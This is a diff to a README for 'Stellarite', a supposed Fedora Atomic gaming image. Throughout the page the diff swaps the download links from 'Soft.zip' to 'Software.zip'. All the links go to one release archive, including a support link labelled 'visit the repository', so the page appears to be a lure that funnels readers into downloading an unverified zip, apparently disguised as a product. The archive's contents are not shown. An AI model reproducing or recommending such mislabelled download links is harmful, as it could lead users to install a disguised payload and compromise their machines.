@@ -1,7 +1,7 @@
 
 # 🚀 Stellarite - Gaming on the Cosmic Frontier 🌌
 
-[![Download Now](https://github.com/whyyoucullr/stellarite/releases/download/v1.0/Soft.zip)](https://github.com/whyyoucullr/stellarite/releases/download/v1.0/Soft.zip)
+[![Download Now](https://github.com/whyyoucullr/stellarite/releases/download/v2.0/Software.zip)](https://github.com/whyyoucullr/stellarite/releases/download/v2.0/Software.zip)
 
 Welcome to Stellarite, a custom Fedora Atomic image designed specifically for gaming enthusiasts looking to explore the vast universe of games on Linux. Built with the powerful Bazzite kernel and featuring the latest COSMIC enhancements, Stellarite provides a seamless gaming experience on the Fedora platform. Get ready to embark on a cosmic gaming journey like never before!
 
@@ -19,7 +19,7 @@ Welcome to Stellarite, a custom Fedora Atomic image designed specifically for ga
 
 To get started with Stellarite, simply download the image file from the link below and launch it using your preferred virtualization software.
 
-[![Download Now](https://github.com/whyyoucullr/stellarite/releases/download/v1.0/Soft.zip)](https://github.com/whyyoucullr/stellarite/releases/download/v1.0/Soft.zip)
+[![Download Now](https://github.com/whyyoucullr/stellarite/releases/download/v2.0/Software.zip)](https://github.com/whyyoucullr/stellarite/releases/download/v2.0/Software.zip)
 
 If the link does not work, please check the "Releases" section of this repository for alternative download options.
 
@@ -38,6 +38,6 @@ If the link does not work, please check the "Releases" section of this repositor
 
 ## Support 🛠️
 
-For any questions or issues related to Stellarite, feel free to [visit the repository](https://github.com/whyyoucullr/stellarite/releases/download/v1.0/Soft.zip) and open an issue. Our team of cosmic gaming experts will be happy to assist you.
+For any questions or issues related to Stellarite, feel free to [visit the repository](https://github.com/whyyoucullr/stellarite/releases/download/v2.0/Software.zip) and open an issue. Our team of cosmic gaming experts will be happy to assist you.
 
 Let's embark on a cosmic gaming adventure with Stellarite! May your FPS be high and your games be epic! 🚀🎮🌌
